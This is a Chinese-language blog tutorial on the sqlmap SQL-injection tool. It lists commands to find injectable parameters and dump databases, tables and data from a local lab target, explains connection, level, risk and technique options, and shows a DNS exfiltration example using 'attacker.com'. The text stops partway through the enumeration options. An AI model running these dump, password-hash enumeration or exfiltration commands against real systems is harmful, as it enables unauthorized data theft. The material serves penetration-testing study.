<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Sqlmap-SQL注入漏洞 - Eccentric&#39;s Note</title><meta name="Description" content="本站主要用来收集整理资料、记录笔记，方便自己查询使用。"><meta property="og:title" content="Sqlmap-SQL注入漏洞" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://hubu8.github.io/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="https://hubu8.github.io/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2025-05-27T13:59:26+08:00" />
<meta property="article:modified_time" content="2025-05-27T13:59:26+08:00" /><meta property="og:site_name" content="My cool site" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://hubu8.github.io/logo.png"/>

<meta name="twitter:title" content="Sqlmap-SQL注入漏洞"/>
<meta name="twitter:description" content=""/>
<meta name="application-name" content="Eccentric&#39;s Note">
<meta name="apple-mobile-web-app-title" content="Eccentric&#39;s Note">

<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/header_images/favicon-32x32.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hubu8.github.io/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="https://hubu8.github.io/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/" /><link rel="next" href="https://hubu8.github.io/posts/csrf-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Sqlmap-SQL注入漏洞",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/hubu8.github.io\/posts\/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\/"
        },"genre": "posts","keywords": "kali","wordcount":  10533 ,
        "url": "https:\/\/hubu8.github.io\/posts\/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\/","datePublished": "2025-05-27T13:59:26+08:00","dateModified": "2025-05-27T13:59:26+08:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "Eccentric"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Eccentric&#39;s Note">Eccentric&#39;s Note</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/"> 首页 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/posts/"> 归档 </a><a class="menu-item" href="/pdflist/"> pdf </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/hubu8" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><a class="menu-item" href="/friend/" title="友链"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Eccentric&#39;s Note">Eccentric&#39;s Note</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/" title="">首页</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/posts/" title="">归档</a><a class="menu-item" href="/pdflist/" title="">pdf</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/hubu8" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a class="menu-item" href="/friend/" title="友链">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Sqlmap-SQL注入漏洞</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/hubu8" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Eccentric</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>网络安全</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-05-27">2025-05-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 10533 字&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 22 分钟&nbsp;<span id="/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="leancloud_visitors" data-flag-title="Sqlmap-SQL注入漏洞">
                        <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
                    </span>&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#基础命令">基础命令</a></li>
        <li><a href="#进阶命令">进阶命令</a>
          <ul>
            <li><a href="#输出信息的详细程度">输出信息的详细程度</a></li>
            <li><a href="#目标">目标</a></li>
            <li><a href="#指定连接时信息">指定连接时信息</a></li>
            <li><a href="#指定注入参数">指定注入参数</a></li>
            <li><a href="#指定注入类型">指定注入类型</a></li>
            <li><a href="#枚举信息">枚举信息</a></li>
          </ul>
        </li>
        <li><a href="#用例">用例</a>
          <ul>
            <li><a href="#指定数据包注入">指定数据包注入</a></li>
            <li><a href="#伪静态注入">伪静态注入</a></li>
            <li><a href="#暴力破解列名">暴力破解列名</a></li>
            <li><a href="#文件操作">文件操作</a></li>
            <li><a href="#执行命令">执行命令</a></li>
            <li><a href="#udf提权">UDF提权</a></li>
            <li><a href="#访问-windows-注册表">访问 Windows 注册表</a></li>
            <li><a href="#常规选项">常规选项</a></li>
          </ul>
        </li>
        <li><a href="#tamper脚本">Tamper脚本</a>
          <ul>
            <li><a href="#自带tamper介绍">自带tamper介绍</a></li>
            <li><a href="#编写tamper">编写tamper</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>学安全的都知道这个注入神器 Sqlmap，也正是这些神器的出现，我们逐渐变成了“脚本小子”，要想变成大佬，就要求不仅会用还会写，在面试中也是经常会问 Sqlmap 原理，或者自动化注入这样的问题，所以就深入来学一学 Sqlmap
Sqlmap 使用 Python 语言开发，原来用的 Python2 新版本 1.5 使用 Python3，分析使用的也是 1.5 版本</p>
<ul>
<li>项目地址：https://github.com/sqlmapproject/sqlmap</li>
<li>中文文档：https://sqlmap.campfire.ga</li>
<li>阅读文档是发现的一个有趣的项目：中文文档编写指北，https://github.com/mzlogin/chine-copywriting-guidelines</li>
</ul>
<p>Sqlmap 具有以下功能</p>
<ul>
<li>识别有漏洞的参数</li>
<li>针对有漏洞的参数，自动选取对应类型的 SQL 注入技术</li>
<li>识别后端 DBMS 的相关指纹信息</li>
<li>根据用户使用的选项，它还能采集尽可能多的指纹信息，拉取数据或是掌管整个数据库服务器</li>
</ul>
<p>之后会对这些功能原理进行分析</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/images/df82a208239e430521bdbc67f33afea4.png"
        data-srcset="/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/images/df82a208239e430521bdbc67f33afea4.png, /posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/images/df82a208239e430521bdbc67f33afea4.png 1.5x, /posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/images/df82a208239e430521bdbc67f33afea4.png 2x"
        data-sizes="auto"
        alt="/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/images/df82a208239e430521bdbc67f33afea4.png"
        title="image-20211229131143044" width="847" height="334" /></p>
<h3 id="基础命令">基础命令</h3>
<ol>
<li>判断网址有无SQL注入漏洞</li>
</ol>
<p><code>sqlmap -u &quot;⽹址&quot;</code>
结束以后会得到该⽹站的数据库、操作系统、服务器等版本信息</p>
<ol start="2">
<li>如果存在漏洞可以使用以下命令注出当前网站下所有数据库名</li>
</ol>
<p><code>sqlmap -u &quot;⽹址&quot; --dbs</code></p>
<ol start="3">
<li>注出指定数据库下的所有表名</li>
</ol>
<p><code>sqlmap -u &quot;⽹址&quot; -D 数据库名 --tables</code></p>
<ol start="4">
<li>注出指定数据库指定表下所有列信息</li>
</ol>
<p><code>sqlmap -u &quot;⽹址&quot; -D 数据库名 -T 表名 --columns</code></p>
<ol start="5">
<li>注出所有指定列数据</li>
</ol>
<p><code>sqlmap -u &quot;⽹址&quot; -D 数据库名 -T 表名 -C 列名 --dump</code></p>
<p>在任意环节使用&ndash;dumps，可以将所有数据注出，如指定数据库使用，注出所有数据库下的所有表的所有字段信息</p>
<p><code>python3 .\sqlmap.py -u &quot;http://127.0.0.1:8888/Less-2/?id=1&quot; -D test --dump</code></p>
<p><code>--batch</code>命令可以自动跳过选择项，按默认选项注入</p>
<h3 id="进阶命令">进阶命令</h3>
<p>此部分参考 sqlmap 手册，在手册基础上进行了精炼</p>
<h4 id="输出信息的详细程度">输出信息的详细程度</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">-v	<span class="c1">#共7个级别(0~6)，默认为1</span>
</span></span><span class="line"><span class="cl"><span class="c1">#可以用 -vv 代替 -v 2，推荐使用这种方法</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><strong>0</strong>：只输出 Python 出错回溯信息，错误和关键信息</li>
<li><strong>1</strong>：增加输出普通信息和警告信息</li>
<li><strong>2</strong>：增加输出调试信息</li>
<li><strong>3</strong>：增加输出已注入的 payloads</li>
<li><strong>4</strong>：增加输出 HTTP 请求</li>
<li><strong>5</strong>：增加输出 HTTP 响应头</li>
<li><strong>6</strong>：增加输出 HTTP 响应内容</li>
</ul>
<h4 id="目标">目标</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">-d	<span class="c1">#直连数据库，&#34;mysql://root:root@192.168.0.8:3306/testdb&#34;</span>
</span></span><span class="line"><span class="cl">-u URL
</span></span><span class="line"><span class="cl">-l	<span class="c1">#从Burp代理日志文件中解析目标地址</span>
</span></span><span class="line"><span class="cl">-m	<span class="c1">#从文本文件中批量获取目标</span>
</span></span><span class="line"><span class="cl">-r	<span class="c1">#从文件中读取 HTTP 请求</span>
</span></span><span class="line"><span class="cl">-g	<span class="c1">#使用 Google dork 结果作为目标地址 python sqlmap.py -g &#34;inurl:\&#34;.php?id=1\&#34;&#34;</span>
</span></span><span class="line"><span class="cl">-c	<span class="c1">#从 INI 配置文件中读取选项</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">--purge			<span class="c1">#清除历史缓存</span>
</span></span><span class="line"><span class="cl">--flush-session	<span class="c1">#清除上次扫描的缓存</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>注：<code>-d</code>是一个一个新的开关选项，它允许你通过 DBMS 守护进程监听的 TCP 端口直接连接目标数据库服务器，便于使用 SQL 注入技术对目标数据库进行攻击</p>
<h4 id="指定连接时信息">指定连接时信息</h4>
<p>指定连接目标地址的方式</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">--method<span class="o">=</span>METHOD		<span class="c1">#强制使用提供的 HTTP 方法（例如：PUT）</span>
</span></span><span class="line"><span class="cl">--data<span class="o">=</span>DATA			<span class="c1">#使用 POST 发送数据串；--data=&#34;id=1&amp;user=admin&#34;</span>
</span></span><span class="line"><span class="cl">--param-del<span class="o">=</span><span class="s2">&#34;;&#34;</span>		<span class="c1">#使用参数分隔符，--data=&#34;id=1;user=admin&#34;</span>
</span></span><span class="line"><span class="cl">--cookie<span class="o">=</span>COOKIE		<span class="c1">#指定 HTTP Cookie ，--cookie &#34;id=11&#34; --level 2</span>
</span></span><span class="line"><span class="cl">--drop-set-cookie	<span class="c1">#忽略 HTTP 响应中的 Set-Cookie 参数</span>
</span></span><span class="line"><span class="cl">--user-agent<span class="o">=</span>AGENT	<span class="c1">#指定 HTTP User-Agent</span>
</span></span><span class="line"><span class="cl">--random-agent		<span class="c1">#使用随机的 HTTP User-Agent，随机从 ./txt/user-agents.txt 选一个，不是每次请求换一个</span>
</span></span><span class="line"><span class="cl">--host				<span class="c1">#手动设置 HTTP Host 请求头值，默认情况下，HTTP Host 请求头从提供的目标 URL 中解析</span>
</span></span><span class="line"><span class="cl">--referer<span class="o">=</span>REFERER	<span class="c1">#指定 HTTP Referer，默认情况下不会在 HTTP 请求中发送 HTTP Referer 请求头</span>
</span></span><span class="line"><span class="cl">-H HEADER			<span class="c1">#设置额外的 HTTP 头参数（例如：&#34;X-Forwarded-For: 127.0.0.1&#34;）</span>
</span></span><span class="line"><span class="cl">--headers<span class="o">=</span>HEADERS	<span class="c1">#设置额外的 HTTP 头参数,必须以换行符分隔（例如：&#34;Accept-Language: fr\nETag: 123&#34;）</span>
</span></span><span class="line"><span class="cl">--auth-type，--auth-cred <span class="c1">#选项用于指定后端 Web 服务器实现的 HTTP 协议认证和所有向目标程序发起 HTTP 请求的有效凭据，支持的三种 HTTP 协议认证机制是：Basic、Digest、NTLM，认证凭据的语法是 username:password。一个符合语法的例子：$ python sqlmap.py -u &#34;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id\=1&#34; --auth-type Basic --auth-cred &#34;testuser:testpass&#34;</span>
</span></span><span class="line"><span class="cl">--auth-file			<span class="c1">#HTTP 协议私钥认证</span>
</span></span><span class="line"><span class="cl">--ignore-code		<span class="c1">#忽略（有问题的）HTTP 错误码</span>
</span></span><span class="line"><span class="cl">--proxy，--proxy-cred，--proxy-file 和 --ignore-proxy	<span class="c1">#HTTP(S) 代理，--proxy 并提供 HTTP(S) 代理地址使 HTTP(S) 请求经过该代理到达目标 URL。设置 HTTP(S) 代理的语法是 http://url:port。如果 HTTP(S) 代理需要身份验证，则可以对选项 --proxy-cred 使用 username:password 格式添加对应的凭证可以使用选项 --proxy-file 并指定包含批量代理的文件，想要使用 sqlmap 对本地局域网目标进行测试时应该使用开关 --ignore-proxy 来绕过系统级的 HTTP(S) 代理服务</span>
</span></span><span class="line"><span class="cl">--delay<span class="o">=</span>10			<span class="c1">#设置每个 HTTP 请求的延迟秒数</span>
</span></span><span class="line"><span class="cl">--safe-freq<span class="o">=</span>SAFE	 <span class="c1">#每访问两次给定的合法 URL 才发送一次测试请求</span>
</span></span><span class="line"><span class="cl">--csrf-token 和 --csrf-url	<span class="c1">#绕过反 CSRF 防护</span>
</span></span><span class="line"><span class="cl">-force-ssl			<span class="c1">#支持https的SQL注入只需加入参数-force-ssl告诉sqlmap这是http服务即可</span>
</span></span><span class="line"><span class="cl">--identify-waf		<span class="c1">#检测是否有WAF/IPS/IDS，这个功能以失效</span>
</span></span><span class="line"><span class="cl">--eval				<span class="c1">#在每个请求期间运行自定义的 Python 代码</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="指定注入参数">指定注入参数</h4>
<p>以下选项用于指定要测试的参数</p>
<p>提供自定义注入 payloads 和篡改参数的脚本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">-p TESTPARAMETER	<span class="c1">#指定需要测试的参数</span>
</span></span><span class="line"><span class="cl">--skip<span class="o">=</span>SKIP			<span class="c1">#指定要跳过的参数</span>
</span></span><span class="line"><span class="cl">--dbms<span class="o">=</span>DBMS			<span class="c1">#指定 DBMS 类型（例如：MySQL）</span>
</span></span><span class="line"><span class="cl">--os<span class="o">=</span>OS				<span class="c1">#指定 DBMS 服务器的操作系统类型</span>
</span></span><span class="line"><span class="cl">--prefix<span class="o">=</span>PREFIX		 <span class="c1">#注入 payload 的前缀字符串</span>
</span></span><span class="line"><span class="cl">--suffix<span class="o">=</span>SUFFIX		 <span class="c1">#注入 payload 的后缀字符串</span>
</span></span><span class="line"><span class="cl">--tamper<span class="o">=</span>TAMPER		 <span class="c1">#用给定脚本修改注入数据</span>
</span></span><span class="line"><span class="cl">--batch				<span class="c1"># 自动跳过选择项，按默认选项注入</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>指定检测级别
sqlmap 使用的 payloads 直接从文本文件 xml/payloads.xml 中载入。</p>
<p>根据该文件顶部的相关指导说明进行设置，如果 sqlmap 漏过了特定的注入，</p>
<p>你可以选择自己修改指定的 payload 用于检测。</p>
<p>level有5级，越高检测越全，默认为 1</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">–level 1 检测Get和Post
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">–level 2 检测HTTP Cookie
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">–level 3 检测User-Agent和Referer
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">–level 4 检测
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">–level 5 检测 HOST 头
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>risk有3级，级别越高风险越大，默认为1</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">–risk 2 会在默认的检测上添加大量时间型盲注语句测试
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">–risk 3 会在原基础上添加OR 类型的布尔型盲注 ，可能会update导致修改数据库
</span></span></code></pre></td></tr></table>
</div>
</div><p>页面对比</p>
<p>选项：&ndash;string，&ndash;not-string，&ndash;regexp 和 &ndash;code</p>
<p>默认区分一个 True 查询和 False 查询（布尔型盲注背后的相关理念概念）是通过对比注入前后返回的结果页面是否一致进行判断的</p>
<p>不过这个参照方法并不一定有效，因为可能就算没有进行注入，页面内容也会进行相应更新。例如：页面上有计数器、动态的广告横幅、或者任何基于时间而非用户输入内容进行动态渲染的内容。为了避免类似的情况，sqlmap 会尽可能尝试识别出对应的代码段所返回的请求内容并做好相关的处理</p>
<p>如果用户知道可以通过 HTTP 状态码区分 True 查询和 False 查询（例如：200 对应 True，401 对应 False），那么可以向 sqlmap 提供对应的信息。（例如：&ndash;code=200）</p>
<p>开关：&ndash;text-only 和 &ndash;titles</p>
<p>如果用户知道可以通过 HTML 标题区分 True 查询和 False 查询（例如：Welcome 对应 True，Forbidden 对应 False），那么可以使用 &ndash;titles 开启基于标题对比的开关</p>
<p>如果 HTTP 响应报文中存在无效信息（例如：脚本、嵌套元素等），可以通过过滤页面的内容（开关 &ndash;text-only）而只获取文本内容。通过这种方式，大多数情况下，这样会自动调优检测引擎</p>
<h4 id="指定注入类型">指定注入类型</h4>
<p>以下选项用于调整特定 SQL 注入技术的测试方法</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">--technique<span class="o">=</span>TECH	<span class="c1">#使用的 SQL 注入技术（默认为“BEUSTQ”)</span>
</span></span><span class="line"><span class="cl">B: Boolean-based blind SQL injection（布尔型盲注）
</span></span><span class="line"><span class="cl">E: Error-based SQL injection（报错型注入）
</span></span><span class="line"><span class="cl">U: UNION query SQL injection（联合查询注入）
</span></span><span class="line"><span class="cl">S: Stacked queries SQL injection（堆查询注入）
</span></span><span class="line"><span class="cl">T: Time-based blind SQL injection（时间型盲注）
</span></span><span class="line"><span class="cl">Q: inline Query injection（内联查询注入）
</span></span><span class="line"><span class="cl"><span class="c1"># 例如，如果仅测试利用报错型注入和堆叠查询注入，你可以提供 ES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">--time-sec<span class="o">=</span>TIMESEC  <span class="c1">#设置延时注入的时间（默认为 5）</span>
</span></span><span class="line"><span class="cl">--second-order<span class="o">=</span>S..  <span class="c1">#设置二阶响应的结果显示页面的 URL（该选项用于二阶 SQL 注入）</span>
</span></span><span class="line"><span class="cl">--dns-domain		<span class="c1">#DNS 渗出攻击</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 如果用户正控制着一台注册为 DNS 域名服务器的主机（例如：域名 attacker.com），则可以使用该选项（例如：--dns-domain attacker.com）来启用此攻击。它的前提条件是使用 Administrator（即管理员）权限（因为需要使用特权端口 53）运行 sqlmap，这时可以使用常用的（盲注）技术来进行攻击。如果已经识别出一种有效攻击方式（最好是时间型盲注），则这种攻击能够加速获取数据的过程。如果报错型注入或联合查询注入技术可用，则默认情况下将跳过 DNS 渗出攻击测试</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="枚举信息">枚举信息</h4>
<p>以下选项用于获取数据库的信息，结构和数据表中的数据。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">-a, --all          <span class="c1">#获取所有信息、数据</span>
</span></span><span class="line"><span class="cl">-f, --fingerprint	<span class="c1">#采用特定 SQL 方言或者内带特定错误信息等技术展开详细的 DBMS 指纹识别</span>
</span></span><span class="line"><span class="cl">-b, --banner        <span class="c1">#获取 DBMS banner,返回数据库的版本号</span>
</span></span><span class="line"><span class="cl">--current-user			<span class="c1">#获取 DBMS 当前用户</span>
</span></span><span class="line"><span class="cl">--current-db			<span class="c1">#获取 DBMS 当前数据库</span>
</span></span><span class="line"><span class="cl">--hostname				<span class="c1">#获取 DBMS 服务器的主机名</span>
</span></span><span class="line"><span class="cl">--is-dba				<span class="c1">#探测 DBMS 当前用户是否为 DBA（数据库管理员）</span>
</span></span><span class="line"><span class="cl">--users					<span class="c1">#枚举出 DBMS 所有用户</span>
</span></span><span class="line"><span class="cl">--passwords				<span class="c1">#枚举出 DBMS 所有用户的密码哈希</span>
</span></span><span class="line"><span class="cl">--privileges			<span class="c1">#枚举出 DBMS 所有用户特权级</span>
</span></span><span class="line"><span class="cl">--roles					<span class="c1">#枚举出 DBMS 所有用户角色</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">--dbs					<span class="c1">#枚举出 DBMS 所有数据库</span>
</span></span><span class="line"><span class="cl">--tables				<span class="c1">#枚举出 DBMS 数据库中的所有表，--exclude-sysdbs 以排除所有的系统数据库，对于 Oracle，你需要提供 TABLESPACE_NAME 而不是数据库名称</span>
</span></span><span class="line"><span class="cl">--columns				<span class="c1">#枚举出 DBMS 表中的所有列，对于 PostgreSQL，你需要提供 public 或系统数据库的名称。这是因为不可能枚举其他数据库表，只能枚举出 Web 应用程序用户连接到的数据库模式下的表，它们总是以 public 为别名</span>
